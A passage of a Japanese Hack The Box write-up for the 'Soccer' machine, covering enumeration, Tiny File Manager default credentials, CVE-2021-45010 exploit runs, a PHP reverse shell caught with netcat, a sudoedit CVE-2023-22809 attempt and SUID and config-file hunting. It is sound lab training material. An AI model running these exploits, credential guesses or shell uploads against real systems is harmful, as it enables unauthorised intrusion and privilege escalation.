---
{"dg-publish":true,"permalink":"/hack-the-box-writeups/retired/easy/soccer-memo-and-writeup/","noteIcon":""}
---

![](https://i.imgur.com/MFFHLmO.png)


- URL : 
- #easy
- OS : #Linux
- Machine Author(s): [sau123](https://app.hackthebox.com/users/201596)
- Hack Date: 2025-06-10,11:50

---
# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ


| **ポート** | **サービス** | **バージョン**                       | **その他**                                                                                                           |
| ------- | -------- | ------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| 22/tcp  | ssh      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 | Ubuntu Linux; protocol 2.0ssh-hostkey 情報あり                                                                        |
| 80/tcp  | http     | nginx 1.18.0 (Ubuntu)           | http-server-header: nginx/1.18.0 (Ubuntu)サポートメソッド: GET, HEAD, POST, OPTIONShttp-title: リダイレクト先 http://soccer.htb/ |

## nmap
```bash
echo 'export Target_IP="10.129.5.59"' >> ~/.zshrc
source ~/.zshrc
sudo nmap -p0-65535 -T4 -Pn -v --open $Target_IP -oG open_ports.txt
ports=$(grep "Ports:" open_ports.txt | awk -F'Ports: ' '{print $2}' | tr ',' '\n' | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sCV -A -Pn -p"$ports" -vv $Target_IP


PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://soccer.htb/
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/9%OT=22%CT=%CU=42188%PV=Y%DS=2%DC=T%G=N%TM=68479E11%
OS:P=aarch64-unknown-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A
OS:)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M55
OS:2ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
OS:0%CD=S)

Uptime guess: 3.462 days (since Fri Jun  6 08:47:32 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   196.87 ms 10.10.14.1
2   197.17 ms 10.129.5.59

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 19:53
Completed NSE at 19:53, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.78 seconds
           Raw packets sent: 34 (2.306KB) | Rcvd: 27 (1.858KB)
                                                                      
```

`http://soccer.htb/`というサイトが見つかった
- 特に入力箇所などない静的サイト
![](https://i.imgur.com/Dj5qxtY.jpeg)


## whatweb
- 特に有用な情報はない
```bash
└─$ whatweb http://soccer.htb/                                                                     
http://soccer.htb/ [200 OK] Bootstrap[4.1.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.5.59], JQuery[3.2.1,3.6.0], Script, Title[Soccer - Index], X-UA-Compatible[IE=edge], nginx[1.18.0]

```

## Feroxbuster
以下の二つのサイトが新しく見つかった
- `http://soccer.htb/tiny/`
- `http://soccer.htb/tiny/uploads/`
```bash
└─$ feroxbuster -u http://soccer.htb/                    
                                                                                                                                                                     
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soccer.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l       10w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      494l     1440w    96128c http://soccer.htb/ground3.jpg
200      GET     2232l     4070w   223875c http://soccer.htb/ground4.jpg
200      GET      711l     4253w   403502c http://soccer.htb/ground2.jpg
200      GET      809l     5093w   490253c http://soccer.htb/ground1.jpg
200      GET      147l      526w     6917c http://soccer.htb/
301      GET        7l       12w      178c http://soccer.htb/tiny => http://soccer.htb/tiny/
301      GET        7l       12w      178c http://soccer.htb/tiny/uploads => http://soccer.htb/tiny/uploads/
[####################] - 3m     90021/90021   0s      found:7       errors:1      
[####################] - 2m     30000/30000   233/s   http://soccer.htb/ 
[####################] - 2m     30000/30000   220/s   http://soccer.htb/tiny/ 
[####################] - 2m     30000/30000   220/s   http://soccer.htb/tiny/uploads/                                                                                                                                                                          
```

`http://soccer.htb/tiny/`
- 何かのログイン画面出てくる
	- H3Kってなんだ？
	- 以下の認証情報ではログインできない
	- admin : admin
	- admin : root
	- root : root
![](https://i.imgur.com/pvgbAHc.png)

ログインしないとだめ
![](https://i.imgur.com/81sViNf.png)

`http://soccer.htb/tiny/`のログイン画面の「CCP Programmers」はリンクが埋め込まれている
クリックすると、以下のサイトに飛ぶ
- https://tinyfilemanager.github.io/
具体的なコードはこっち
- https://github.com/prasathmani/tinyfilemanager

バージョンはどこに書いてあるんだ？
- `view-source:http://soccer.htb/tiny/tinyfilemanager.php`に書いてある
**Tiny File Manager 2.4.3**であることがわかる
```sh
<SNIP>
                        <div class="footer text-center">
                            &mdash;&mdash; &copy;
                            <a href="https://tinyfilemanager.github.io/" target="_blank" class="text-muted" data-version="2.4.3">CCP Programmers</a> &mdash;&mdash;
                        </div>
<SNIP>
```


# Foothold

Tiny File Manager 2.4.3には、パストラバーサルの脆弱性がある
- CVE-2021-45010
	- Tiny File Manager Project の Tiny File Manager <= 2.4.3 の tinyfilemanager.php のファイルアップロード機能に存在するパストラバーサルの脆弱性により、有効なユーザーアカウントを持つリモートの攻撃者が悪意のある PHP ファイルを Web ルートにアップロードし、ターゲットサーバー上でコードを実行できる可能性がある
	- https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/
	- https://jvndb.jvn.jp/ja/contents/2021/JVNDB-2021-018829.html
	- https://www.exploit-db.com/exploits/50828

認証情報ないとPoC使えないじゃんって思ってたら、以下のexploit DatabaseのExampleに書いてあるadmin : admin@123でログインできる
### 認証情報
admin : admin@123
- https://www.exploit-db.com/exploits/50828

- PoC
	- https://github.com/febinrev/tinyfilemanager-2.4.3-exploit
	- https://github.com/BKreisel/CVE-2021-45010
	- https://www.exploit-db.com/exploits/50828


`https://github.com/febinrev/tinyfilemanager-2.4.3-exploit`は、ファイルアップロードができないらしい
```sh
└─$ ./exploit.sh http://soccer.htb/tiny/tinyfilemanager.php admin "admin@123"
/usr/bin/curl
[✔] Curl found! 
/usr/bin/jq
[✔] jq found! 

[+]  Login Success! Cookie: filemanager=2u2vj0qes0cvg9q2mkrbuqp6bt 

[*] Try to Leak Web root directory path 

[+] Found WEBROOT directory for tinyfilemanager using full path disclosure bug : /var/www/html/tiny/ 

[-] File Upload Unsuccessful! Exiting! 

```

- `https://github.com/BKreisel/CVE-2021-45010`を試すけど、フォルダに書き込み権限がないから失敗するらしい
```sh
main.py -u http://soccer.htb/tiny/tinyfilemanager.php -l admin -p admin@123
└─$ python3 main.py -u http://soccer.htb/tiny/tinyfilemanager.php -l admin -p admin@123

 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗  ██╗      ██╗  ██╗███████╗ ██████╗  ██╗ ██████╗ 
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗███║      ██║  ██║██╔════╝██╔═████╗███║██╔═████╗
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝╚██║█████╗███████║███████╗██║██╔██║╚██║██║██╔██║
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ██║╚════╝╚════██║╚════██║████╔╝██║ ██║████╔╝██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗ ██║           ██║███████║╚██████╔╝ ██║╚██████╔╝
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═╝           ╚═╝╚══════╝ ╚═════╝  ╚═╝ ╚═════╝ 
                                                                                                      
PoC for CVE-2021-45010 - Tiny File Manager Version < 2.4.7

[*] Attempting Login:
        [*] URL      : http://soccer.htb/tiny/tinyfilemanager.php
        [*] Username : admin
        [*] Password : admin@123
[+] Session Cookie 🍪: me3ni5be7a2h54qrd05hhtb5ub
[+] Login Success!
[+] Vulnerable version detected: 2.4.3
[*] Attempting to Leak Web Root...
        [+] Got Web Root: /var/www/html/tiny
[*] Attempting Webshell Upload:
[*] Filename : vhwhulidqp.php
[*] GUI Path  : <ROOT>
[*] Filesystem Path  ../../../../../../../../../../../var/www/html/tiny//vhwhulidqp.php
[-] Error: The specified folder for upload isn't writeable.

```

確かに試してみると、このフォルダには書き込み権限がないってなる
![](https://i.imgur.com/1uXjYzl.png)


手動で行う
`https://www.revshells.com/`のPHP PentestMonkeyでリバースシェルを作成する
しかし、こっちの` /var/www/html/tiny/uploads `には、書き込みできる
エラーが起きない
![](https://i.imgur.com/DCWqlSO.png)

www-dataとして、リバースシェル確立成功
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 7777
listening on [any] 7777 ...
connect to [10.10.14.4] from (UNKNOWN) [10.129.5.59] 55922
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 03:34:30 up  1:41,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1011): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:/$ 

```

他のユーザーがいるのか、`/etc/passwd`を見る
- playerというユーザーアカウントがあることがわかる
- mysqlといアカウントがあるので、mysqlが動いているかな
```bash
www-data@soccer:/$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
player:x:1001:1001::/home/player:/bin/bash
mysql:x:113:121:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false

```

user.txtがあることがわかるが、読み取り権限がないので、横展開か、権限昇格しないといけない
```bash
www-data@soccer:/home$ 
ls
player
www-data@soccer:/home$ cd player
cd player
www-data@soccer:/home/player$ ls
ls
user.txt
www-data@soccer:/home/player$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

```

`sudo -l`を打つと、TTYを要求される
- 実行できてもwww-dataのパスワードを知らない
```bash
www-data@soccer:/var/backups$ sudo -l
sudo -l
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
www-data@soccer:/var/backups$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@soccer:/var/backups$ sudo -l
sudo -l
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 
```

SudoのVersionは、　1.8.31
CVE-2023-22809の範囲内
- https://www.exploit-db.com/exploits/51217
```bash
www-data@soccer:/var/backups$ sudo --version
sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31

www-data@soccer:/$ dpkg -l | grep sudo
dpkg -l | grep sudo
ii  sudo                            1.8.31-1ubuntu1.2                 amd64        Provide limited super user privileges to specific users
```

悪用しようとしたけど、www-dataの認証情報わからなくて、使えない
playerに横展開後で権限昇格できそう
```sh
www-data@soccer:/$ EDITOR='vim -- /etc/sudoers' sudoedit /etc/sudoedit.txt
EDITOR='vim -- /etc/sudoers' sudoedit /etc/sudoedit.txt
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

sudoedit: 3 incorrect password attempts

```

uname -a
```bash
www-data@soccer:/var/backups$ uname -a
uname -a
Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

```

SUIDが設定されてるバイナリ

- 一般的でないSUID
	- /usr/local/bin/doas
		- 気になる
	- /usr/lib/snapd/snap-confine
	- /usr/lib/dbus-1.0/dbus-daemon-launch-helper
	- /usr/lib/policykit-1/polkit-agent-helper-1
	- /usr/lib/eject/decrypt-get-device
	- /usr/bin/at
		- GTFOBins
			- https://gtfobins.github.io/gtfobins/at/
			- SUIDでの記述はなし
	- /snap/snapd/17883/usr/lib/snapd/snap-confine
```sh
www-data@soccer:/var/backups$ find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null
    70968     44 -rwsr-xr-x   1 root     root        42224 Nov 17  2022 /usr/local/bin/doas
    18263    140 -rwsr-xr-x   1 root     root       142792 Nov 28  2022 /usr/lib/snapd/snap-confine
     7696     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    14300    464 -rwsr-xr-x   1 root     root         473576 Mar 30  2022 /usr/lib/openssh/ssh-keysign
    16207     24 -rwsr-xr-x   1 root     root          22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
     7700     16 -rwsr-xr-x   1 root     root          14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
     1753     40 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /usr/bin/umount
     2093     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount
     1752     56 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /usr/bin/mount
     1647     68 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /usr/bin/su
    13720     44 -rwsr-xr-x   1 root     root          44784 Nov 29  2022 /usr/bin/newgrp
     3023     84 -rwsr-xr-x   1 root     root          85064 Nov 29  2022 /usr/bin/chfn
     1724    164 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /usr/bin/sudo
     3027     68 -rwsr-xr-x   1 root     root          68208 Nov 29  2022 /usr/bin/passwd
     3026     88 -rwsr-xr-x   1 root     root          88464 Nov 29  2022 /usr/bin/gpasswd
     3024     52 -rwsr-xr-x   1 root     root          53040 Nov 29  2022 /usr/bin/chsh
     2242     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at
      135    121 -rwsr-xr-x   1 root     root         123560 Nov 25  2022 /snap/snapd/17883/usr/lib/snapd/snap-confine
      814     84 -rwsr-xr-x   1 root     root          85064 Mar 14  2022 /snap/core20/1695/usr/bin/chfn
      820     52 -rwsr-xr-x   1 root     root          53040 Mar 14  2022 /snap/core20/1695/usr/bin/chsh
      889     87 -rwsr-xr-x   1 root     root          88464 Mar 14  2022 /snap/core20/1695/usr/bin/gpasswd
      973     55 -rwsr-xr-x   1 root     root          55528 Feb  7  2022 /snap/core20/1695/usr/bin/mount
      982     44 -rwsr-xr-x   1 root     root          44784 Mar 14  2022 /snap/core20/1695/usr/bin/newgrp
      997     67 -rwsr-xr-x   1 root     root          68208 Mar 14  2022 /snap/core20/1695/usr/bin/passwd
     1107     67 -rwsr-xr-x   1 root     root          67816 Feb  7  2022 /snap/core20/1695/usr/bin/su
     1108    163 -rwsr-xr-x   1 root     root         166056 Jan 19  2021 /snap/core20/1695/usr/bin/sudo
     1166     39 -rwsr-xr-x   1 root     root          39144 Feb  7  2022 /snap/core20/1695/usr/bin/umount
     1255     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1695/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1627    463 -rwsr-xr-x   1 root     root              473576 Mar 30  2022 /snap/core20/1695/usr/lib/openssh/ssh-keysign

```

# Lateral Movement

認証情報1が使いまわせるかと思ったけど、使いまわせない
```sh
www-data@soccer:/$ su - player          
su - player
Password: admin@123

su: Authentication failure
```

設定ファイルの洗い出し
```sh
www-data@soccer:/$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
</dev/null | grep -v "lib\|fonts\|share\|core" ;done

File extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/systemd/resolved.conf.d/isc-dhcp-v4-eth0.conf
/run/systemd/resolve/resolv.conf
/run/systemd/resolve/stub-resolv.conf
/usr/local/etc/doas.conf
/usr/src/linux-headers-5.4.0-135-generic/include/config/auto.conf
/usr/src/linux-headers-5.4.0-135-generic/include/config/tristate.conf
/etc/kernel-img.conf
/etc/xdg/user-dirs.conf
/etc/PackageKit/PackageKit.conf
/etc/PackageKit/Vendor.conf
/etc/depmod.d/ubuntu.conf
/etc/e2scrub.conf
/etc/sysctl.conf
/etc/multipath.conf
/etc/mke2fs.conf
/etc/dbus-1/system.d/org.freedesktop.PackageKit.conf
/etc/dbus-1/system.d/org.freedesktop.Accounts.conf
/etc/dbus-1/system.d/org.freedesktop.ModemManager1.conf
/etc/dbus-1/system.d/com.ubuntu.LanguageSelector.conf
/etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf
/etc/ubuntu-advantage/uaclient.conf
/etc/apache2/conf-available/php7.4-fpm.conf
/etc/apache2/mods-available/php7.4.conf
/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf
/etc/polkit-1/localauthority.conf.d/50-localauthority.conf
/etc/fuse.conf
/etc/apt/apt.conf.d/20apt-esm-hook.conf
/etc/apt/apt.conf.d/20snapd.conf
/etc/lvm/lvm.conf
/etc/lvm/lvmlocal.conf
/etc/iscsi/iscsid.conf
/etc/php/7.4/fpm/pool.d/www.conf
/etc/php/7.4/fpm/php-fpm.conf
/etc/rsyslog.d/50-default.conf
/etc/xattr.conf
/etc/sysctl.d/10-zeropage.conf
/etc/sysctl.d/99-sysctl.conf
/etc/sysctl.d/10-console-messages.conf
/etc/sysctl.d/99-cloudimg-ipv6.conf
/etc/sysctl.d/10-ptrace.conf
/etc/sysctl.d/10-network-security.conf
/etc/sysctl.d/10-kernel-hardening.conf
/etc/sysctl.d/10-ipv6-privacy.conf
/etc/sysctl.d/10-magic-sysrq.conf
/etc/sysctl.d/10-link-restrictions.conf
/etc/fwupd/uefi_capsule.conf
/etc/fwupd/redfish.conf
/etc/fwupd/remotes.d/vendor-directory.conf
/etc/fwupd/remotes.d/dell-esrt.conf
/etc/fwupd/remotes.d/lvfs-testing.conf
/etc/fwupd/remotes.d/vendor.conf
/etc/fwupd/remotes.d/lvfs.conf
/etc/fwupd/daemon.conf
/etc/fwupd/thunderbolt.conf
/etc/fwupd/msr.conf
/etc/ld.so.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/rsyslog.conf
/etc/apport/crashdb.conf
/etc/initramfs-tools/initramfs.conf
/etc/initramfs-tools/update-initramfs.conf
/etc/sos/sos.conf
/etc/logrotate.conf
/etc/security/namespace.conf
/etc/security/time.conf
/etc/security/access.conf
/etc/security/group.conf
/etc/security/capability.conf
/etc/security/faillock.conf
/etc/security/pam_env.conf
/etc/security/limits.conf
/etc/security/sepermit.conf
/etc/ldap/ldap.conf
/etc/vmware-tools/vgauth.conf
/etc/vmware-tools/tools.conf
/etc/overlayroot.conf
/etc/adduser.conf
/etc/nsswitch.conf
/etc/overlayroot.local.conf
/etc/ucf.conf
/etc/pam.conf
/etc/deluser.conf
/etc/popularity-contest.conf
/etc/init/mysql.conf
/etc/nginx/modules-enabled/50-mod-mail.conf
/etc/nginx/modules-enabled/50-mod-http-image-filter.conf
/etc/nginx/modules-enabled/50-mod-stream.conf
/etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf
/etc/nginx/snippets/fastcgi-php.conf
/etc/nginx/snippets/snakeoil.conf
/etc/nginx/nginx.conf
/etc/nginx/fastcgi.conf
/etc/modules-load.d/modules.conf
/etc/modprobe.d/blacklist-rare-network.conf
/etc/modprobe.d/blacklist.conf
/etc/modprobe.d/mdadm.conf
/etc/modprobe.d/blacklist-ath_pci.conf
/etc/modprobe.d/iwlwifi.conf
/etc/modprobe.d/blacklist-firewire.conf
/etc/modprobe.d/blacklist-framebuffer.conf
/etc/ca-certificates.conf
/etc/udisks2/udisks2.conf
/etc/mdadm/mdadm.conf
/etc/tmpfiles.d/screen-cleanup.conf
/etc/host.conf
/etc/resolv.conf
/etc/udev/udev.conf
/etc/apparmor/parser.conf
/etc/selinux/semanage.conf
/etc/dhcp/dhclient.conf
/etc/debconf.conf
/etc/ltrace.conf
/etc/gai.conf
/etc/systemd/journald.conf
/etc/systemd/timesyncd.conf
/etc/systemd/logind.conf
/etc/systemd/system.conf
/etc/systemd/resolved.conf
/etc/systemd/sleep.conf
/etc/systemd/networkd.conf
/etc/systemd/pstore.conf
/etc/systemd/user.conf
/etc/hdparm.conf
/etc/usb_modeswitch.conf
/snap/snapd/17883/etc/apt/apt.conf.d/20snapd.conf
/snap/snapd/17883/etc/ld.so.conf
/snap/snapd/17883/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/snap/lxd/23991/etc/logrotate.conf
/snap/lxd/23991/etc/lvm/lvm.conf
/snap/lxd/23991/lxc/config/common.conf.d/00-lxcfs.conf
/snap/lxd/23991/lxc/config/common.conf.d/01-local.conf
/snap/lxd/22753/etc/logrotate.conf
/snap/lxd/22753/etc/lvm/lvm.conf
/snap/lxd/22753/lxc/config/common.conf.d/00-lxcfs.conf
/snap/lxd/22753/lxc/config/common.conf.d/01-local.conf

File extension:  .config
/usr/src/linux-headers-5.4.0-135/tools/perf/Makefile.config
/usr/src/linux-headers-5.4.0-135/tools/power/acpi/Makefile.config
/usr/src/linux-headers-5.4.0-135-generic/.config
/etc/manpath.config

File extension:  .cnf
/etc/alternatives/my.cnf
/etc/mysql/mysql.cnf
/etc/mysql/debian.cnf
/etc/mysql/my.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/ssl/openssl.cnf

```


mysqlの設定ファイル
- 特に認証情報がありそうなファイルは見れない
```sh
www-data@soccer:/$ cat /etc/mysql/debian.cnf
cat /etc/mysql/debian.cnf
cat: /etc/mysql/debian.cnf: Permission denied

```

### soc-player.soccer.htb
nginxの設定ファイル
- soc-player.htbという設定ファイルがあることがわかる
```sh
www-data@soccer:/var$ ls -l /etc/nginx/sites-enabled/
ls -l /etc/nginx/sites-available/ls -l /etc/nginx/sites-enabled/
total 0
lrwxrwxrwx 1 root root 34 Nov 17  2022 default -> /etc/nginx/sites-available/default
lrwxrwxrwx 1 root root 41 Nov 17  2022 soc-player.htb -> /etc/nginx/sites-available/soc-player.htb
www-data@soccer:/var$ 
ls -l /etc/nginx/sites-available/
total 8
-rw-r--r-- 1 root root 442 Dec  1  2022 default
-rw-r--r-- 1 root root 332 Nov 17  2022 soc-player.htb
```

このことから、soc-player.soccer.htbというホストがあることがわかる
3000番に飛ぶ
```sh
www-data@soccer:/var$ cat /etc/nginx/sites-available/soc-player.htb
cat /etc/nginx/sites-available/soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

